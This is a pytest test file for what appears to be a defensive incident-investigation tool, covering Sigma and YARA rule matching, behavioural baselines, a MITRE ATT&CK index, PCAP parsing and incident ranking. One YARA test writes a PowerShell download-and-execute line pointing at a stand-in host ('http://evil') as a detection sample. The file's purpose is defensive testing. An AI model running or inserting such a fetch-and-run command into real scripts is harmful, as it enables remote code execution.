"""Tests for the new modules added in the second pass:
- detection/engine.py (§19)
- core/baseline.py (§31)
- knowledge/attack_loader.py + attack_index.py (§99-101)
- tools/pcap.py (§33)
- incident prioritization (§111)
"""
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import asyncio
import pytest
import pytest_asyncio
from datetime import datetime, timezone

from witness.db import AsyncSessionLocal, init_db, drop_db, Base
from witness.config import settings
from witness.models import Evidence, DetectionRule, KnowledgeItem, Incident
from witness.core.evidence import add_evidence
from witness.core.hypothesis import HypothesisEngine
from witness.runtime.runtime import create_investigation
from witness.detection.engine import (
    evaluate_sigma_rule, evaluate_yara_rule, match_iocs,
    evaluate_behavioral_rule, detect_baseline_deviations,
    load_builtin_rules, evaluate_all_rules,
)
from witness.core.baseline import build_baselines, Baseline, detect_deviations, anomalies_as_evidence
from witness.knowledge.attack_loader import load_attack_knowledge
from witness.knowledge.attack_index import AttackIndex
from witness.tools.pcap import parse_pcap
from witness.attack.mapper import ENTERPRISE_TECHNIQUES, ICS_TECHNIQUES


@pytest_asyncio.fixture
async def db_session():
    """Fresh in-memory DB per test."""
    import witness.db as db_module
    from sqlalchemy.ext.asyncio import create_async_engine, async_sessionmaker, AsyncSession

    engine = create_async_engine("sqlite+aiosqlite:///:memory:", future=True)
    session_factory = async_sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)

    orig_engine = db_module.engine
    orig_factory = db_module.AsyncSessionLocal
    db_module.engine = engine
    db_module.AsyncSessionLocal = session_factory

    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    async with session_factory() as session:
        try:
            yield session
            await session.rollback()
        finally:
            await session.close()

    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.drop_all)

    db_module.engine = orig_engine
    db_module.AsyncSessionLocal = orig_factory


# --------------------------------------------------------------------------- #
# §19 Detection Engine
# --------------------------------------------------------------------------- #

class TestDetectionEngine:
    @pytest.mark.asyncio
    async def test_load_builtin_rules(self, db_session):
        n = await load_builtin_rules(db_session)
        assert n > 0
        # Re-loading should be idempotent.
        n2 = await load_builtin_rules(db_session)
        assert n2 == 0

    @pytest.mark.asyncio
    async def test_evaluate_sigma_rule_matches_powershell(self, db_session):
        inv = await create_investigation(db_session, title="t", objective="o")
        # Add a PowerShell evidence row.
        await add_evidence(
            db_session, inv.id, source="sysmon", source_type="log",
            timestamp=datetime.now(timezone.utc),
            normalized_data={
                "event_kind": "process_exec", "image": "powershell.exe",
                "command_line": "powershell.exe -enc abc",
            },
        )
        # And a non-PowerShell row.
        await add_evidence(
            db_session, inv.id, source="sysmon", source_type="log",
            timestamp=datetime.now(timezone.utc),
            normalized_data={
                "event_kind": "process_exec", "image": "notepad.exe",
                "command_line": "notepad",
            },
        )
        from witness.core.evidence import list_evidence
        evs = await list_evidence(db_session, inv.id)
        sigma_body = """
title: Test PowerShell
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        image|endswith: powershell.exe
    condition: selection
"""
        matches = await evaluate_sigma_rule(sigma_body, evs)
        assert len(matches) >= 1
        for m in matches:
            assert "powershell" in m.normalizedData.get("image", "").lower()

    @pytest.mark.asyncio
    async def test_evaluate_yara_rule_compiles_and_matches(self, tmp_path):
        # Write a test file containing suspicious strings.
        file = tmp_path / "test.txt"
        file.write_text("IEX(New-Object Net.WebClient).DownloadString('http://evil')")
        rule = 'rule SuspiciousStrings { strings: $a = "IEX(" nocase condition: $a }'
        matches = await evaluate_yara_rule(rule, [str(file)])
        assert len(matches) == 1
        assert "SuspiciousStrings" in matches[0]["rules"]

    @pytest.mark.asyncio
    async def test_evaluate_yara_rule_rejects_invalid(self):
        matches = await evaluate_yara_rule("rule Bad { condition: bogus }", ["/etc/hosts"])
        # Invalid YARA should return empty, not raise.
        assert matches == []

    @pytest.mark.asyncio
    async def test_behavioral_rule_matches_event_kind(self, db_session):
        inv = await create_investigation(db_session, title="t", objective="o")
        for _ in range(3):
            await add_evidence(
                db_session, inv.id, source="windows_event_log", source_type="log",
                timestamp=datetime.now(timezone.utc),
                normalized_data={"event_kind": "auth_failure", "user": "admin"},
            )
        from witness.core.evidence import list_evidence
        evs = await list_evidence(db_session, inv.id)
        matches = await evaluate_behavioral_rule({"event_kind": "auth_failure"}, evs)
        assert len(matches) == 3

    @pytest.mark.asyncio
    async def test_evaluate_all_rules_with_builtin(self, db_session):
        inv = await create_investigation(db_session, title="t", objective="o")
        await add_evidence(
            db_session, inv.id, source="sysmon", source_type="log",
            timestamp=datetime.now(timezone.utc),
            normalized_data={"event_kind": "process_exec",
                              "image": "powershell.exe",
                              "command_line": "-enc abc"},
        )
        await load_builtin_rules(db_session)
        result = await evaluate_all_rules(db_session, inv.id)
        assert result["rules_evaluated"] > 0
        # The built-in Sigma rule should match the PowerShell evidence.
        assert len(result["matches"]) > 0


# --------------------------------------------------------------------------- #
# §31 Baseline Engine
# --------------------------------------------------------------------------- #

class TestBaselineEngine:
    def test_baseline_records_feature_counts(self):
        b = Baseline("user", "alice")
        for v in ["powershell.exe", "powershell.exe", "notepad.exe"]:
            b.add({"image": v})
        # 2/3 powershell, 1/3 notepad.
        assert abs(b.p("image", "powershell.exe") - 2/3) < 0.01
        assert abs(b.p("image", "notepad.exe") - 1/3) < 0.01
        # A novel value should be a deviation.
        assert b.is_deviation("image", "evil.exe")
        # An observed value should not.
        assert not b.is_deviation("image", "powershell.exe")

    @pytest.mark.asyncio
    async def test_detect_deviations_finds_novel_value(self, db_session):
        inv = await create_investigation(db_session, title="t", objective="o")
        # 10 baseline observations with image=powershell.exe on host=WS-01.
        for _ in range(10):
            await add_evidence(
                db_session, inv.id, source="sysmon", source_type="log",
                timestamp=datetime(2025, 9, 4, 14, 0, 0, tzinfo=timezone.utc),
                host="WS-01",
                normalized_data={"event_kind": "process_exec",
                                  "image": "powershell.exe"},
            )
        # 3 test observations with image=evil.exe (novel) on host=WS-01.
        for _ in range(3):
            await add_evidence(
                db_session, inv.id, source="sysmon", source_type="log",
                timestamp=datetime(2025, 9, 4, 15, 0, 0, tzinfo=timezone.utc),
                host="WS-01",
                normalized_data={"event_kind": "process_exec",
                                  "image": "evil.exe"},
            )
        deviations = await detect_deviations(db_session, inv.id, split_ratio=0.8)
        # We should see at least one deviation flagged.
        assert len(deviations) > 0
        # Either a novel-value deviation (image=evil.exe on host WS-01) or
        # a first-occurrence deviation (new process evil.exe).
        assert any(
            (d["feature"] == "image" and d["value"] == "evil.exe")
            or (d["feature"] == "_first_occurrence" and d["entity_id"] == "evil.exe")
            for d in deviations
        )

    @pytest.mark.asyncio
    async def test_anomalies_as_evidence(self, db_session):
        inv = await create_investigation(db_session, title="t", objective="o")
        ev_ids = await anomalies_as_evidence(db_session, inv.id, [
            {"entity_type": "user", "entity_id": "alice",
             "feature": "image", "value": "evil.exe",
             "baseline_probability": 0.0, "baseline_observations": 5,
             "evidence_id": "EV-1"},
        ])
        assert len(ev_ids) == 1
        from witness.core.evidence import list_evidence
        evs = await list_evidence(db_session, inv.id)
        assert any(e.normalizedData.get("event_kind") == "baseline_deviation"
                    for e in evs)


# --------------------------------------------------------------------------- #
# §99-101 Knowledge Layer (MITRE ATT&CK loader)
# --------------------------------------------------------------------------- #

class TestKnowledgeLayer:
    @pytest.mark.asyncio
    async def test_load_attack_knowledge_fallback(self, db_session, monkeypatch):
        """When offline (no download), the loader falls back to the
        hand-curated dicts so the system remains usable."""
        # Force privacy mode and disable download — the loader should use the
        # fallback dicts.
        from witness.config import settings as cfg
        monkeypatch.setattr(cfg, "privacy_mode", "LOCAL_ONLY")
        monkeypatch.setattr(cfg, "allow_attack_download", False)
        # Pre-create the data dir so the cache check works.
        Path(cfg.knowledge_dir).mkdir(parents=True, exist_ok=True)
        summary = await load_attack_knowledge(db_session)
        # Fallback should populate the DB with our hand-curated dict entries.
        assert summary["fallback"] > 0
        # KnowledgeItem rows should exist.
        from sqlalchemy import select
        res = await db_session.execute(select(KnowledgeItem))
        items = list(res.scalars().all())
        assert len(items) > 0
        # T1059.001 should be present.
        ids = [i.externalId for i in items]
        assert "T1059.001" in ids

    def test_attack_index_retrieval(self):
        # Build an index from synthetic KnowledgeItem-like objects.
        class KI:
            pass
        ki1 = KI(); ki1.externalId = "T1059.001"; ki1.name = "PowerShell"
        ki1.body = {"description": "PowerShell command and scripting interpreter"}
        ki1.kind = "attack_enterprise"
        ki2 = KI(); ki2.externalId = "T1003"; ki2.name = "OS Credential Dumping"
        ki2.body = {"description": "Dumping credentials from memory and disk"}
        ki2.kind = "attack_enterprise"
        idx = AttackIndex([ki1, ki2])
        # Token-overlap retrieval should find PowerShell for "powershell".
        results = idx.retrieve("powershell command")
        ids = [r["external_id"] for r in results]
        assert "T1059.001" in ids
        # And OS Credential Dumping for "credential memory".
        results = idx.retrieve("credential memory")
        ids = [r["external_id"] for r in results]
        assert "T1003" in ids

    def test_attack_index_technique_name(self):
        class KI: pass
        ki = KI(); ki.externalId = "T0866"; ki.name = "Exploit Public-Facing Application"
        ki.body = {"description": "Exploiting vulnerabilities in internet-facing services"}
        ki.kind = "attack_ics"
        idx = AttackIndex([ki])
        assert idx.technique_name("T0866") == "Exploit Public-Facing Application"
        assert idx.technique_name("T9999") is None


# --------------------------------------------------------------------------- #
# §33 PCAP investigation
# --------------------------------------------------------------------------- #

class TestPcapInvestigation:
    @pytest.mark.asyncio
    async def test_parse_pcap_missing_file(self):
        result = await parse_pcap("/nonexistent.pcap")
        assert result.get("error") == "file_not_found"

    @pytest.mark.asyncio
    async def test_parse_pcap_synthetic_dns(self, tmp_path):
        """Build a tiny synthetic PCAP with a DNS query and verify parsing."""
        import dpkt
        import struct
        # Construct a minimal libpcap file with one DNS query packet.
        pcap_path = tmp_path / "test.pcap"
        with open(pcap_path, "wb") as f:
            # PCAP file header (24 bytes)
            f.write(struct.pack("<IHHiIII",
                                  0xa1b2c3d4,  # magic
                                  2, 4,        # version
                                  0,           # thiszone
                                  0,           # sigfigs
                                  65535,       # snaplen
                                  1))          # linktype: Ethernet
            # Build a DNS query for evil.com.
            dns = dpkt.dns.DNS()
            q = dpkt.dns.DNS.Q(type=dpkt.dns.DNS_A)
            q.name = "evil.com"  # dpkt wants str here
            dns.qd = [q]
            dns_data = bytes(dns)
            udp = dpkt.udp.UDP(sport=12345, dport=53, ulen=8 + len(dns_data))
            udp.data = dns_data
            ip = dpkt.ip.IP(src=b"\x0a\x0a\x01\x32", dst=b"\x08\x08\x08\x08",
                            p=dpkt.ip.IP_PROTO_UDP, data=bytes(udp))
            eth = dpkt.ethernet.Ethernet(src=b"\x00\x0a\x0b\x0c\x0d\x0e",
                                            dst=b"\x00\x01\x02\x03\x04\x05",
                                            type=dpkt.ethernet.ETH_TYPE_IP,
                                            data=bytes(ip))
            pkt = bytes(eth)
            ts = 1725448800.0  # 2025-09-04T14:00:00Z
            f.write(struct.pack("<IIII", int(ts), int((ts - int(ts)) * 1e6),
                                   len(pkt), len(pkt)))
            f.write(pkt)
        result = await parse_pcap(str(pcap_path))
        assert "error" not in result, result.get("error", "")
        # DNS should be parsed.
        assert len(result["dns"]) == 1
        assert result["dns"][0]["query"] == "evil.com"
        assert result["dns"][0]["dst_ip"] == "8.8.8.8"
        # Flows should include the UDP flow.
        assert any(f["proto"] == "UDP" and f["dport"] == 53 for f in result["flows"])


# --------------------------------------------------------------------------- #
# §111 Incident prioritization
# --------------------------------------------------------------------------- #

class TestIncidentPrioritization:
    @pytest.mark.asyncio
    async def test_priority_ranks_critical_ot_above_low_enterprise(self, db_session):
        # Critical OT incident.
        inc1 = Incident(id="INC-1", title="OT intrusion", severity="critical",
                         scope="hybrid_it_ot", status="open",
                         detectionConfidence=0.9, evidenceCoverage=0.8)
        # Low enterprise incident.
        inc2 = Incident(id="INC-2", title="Phishing", severity="low",
                         scope="enterprise", status="open",
                         detectionConfidence=0.5, evidenceCoverage=0.3)
        db_session.add(inc1)
        db_session.add(inc2)
        await db_session.flush()
        # Reuse the API helper.
        from witness.api.app import _incident_priority
        p1 = _incident_priority(inc1)
        p2 = _incident_priority(inc2)
        assert p1 > p2


# --------------------------------------------------------------------------- #
# Cross-platform run scripts — smoke test that they at least exist and parse.
# --------------------------------------------------------------------------- #

class TestCrossPlatformScripts:
    def test_start_sh_exists(self):
        p = Path(__file__).resolve().parent.parent.parent / "scripts" / "start.sh"
        assert p.exists()
        # Shellcheck-style sanity check: starts with shebang.
        assert p.read_text().startswith("#!/usr/bin/env bash")

    def test_start_bat_exists(self):
        p = Path(__file__).resolve().parent.parent.parent / "scripts" / "start.bat"
        assert p.exists()

    def test_start_ps1_exists(self):
        p = Path(__file__).resolve().parent.parent.parent / "scripts" / "start.ps1"
        assert p.exists()
        assert p.read_text().startswith("#!")

    def test_docker_compose_exists(self):
        p = Path(__file__).resolve().parent.parent.parent / "docker-compose.yml"
        assert p.exists()

    def test_dockerfile_backend_exists(self):
        p = Path(__file__).resolve().parent.parent.parent / "docker" / "backend.Dockerfile"
        assert p.exists()

    def test_dockerfile_frontend_exists(self):
        p = Path(__file__).resolve().parent.parent.parent / "docker" / "frontend.Dockerfile"
        assert p.exists()

    def test_env_example_exists(self):
        p = Path(__file__).resolve().parent.parent.parent / ".env.example"
        assert p.exists()
        text = p.read_text()
        # All key env vars should be documented.
        for var in ("WITNESS_DATABASE_URL", "WITNESS_MODEL_PROVIDER",
                     "WITNESS_PRIVACY_MODE", "WITNESS_REQUIRE_APPROVAL_HIGH_RISK",
                     "WITNESS_OT_REQUIRES_DUAL_APPROVAL"):
            assert var in text

    def test_ci_workflow_exists(self):
        p = Path(__file__).resolve().parent.parent.parent / ".github" / "workflows" / "ci.yml"
        assert p.exists()
        text = p.read_text()
        # Should test on multiple OSes.
        for os_name in ("ubuntu-latest", "macos-latest", "windows-latest"):
            assert os_name in text
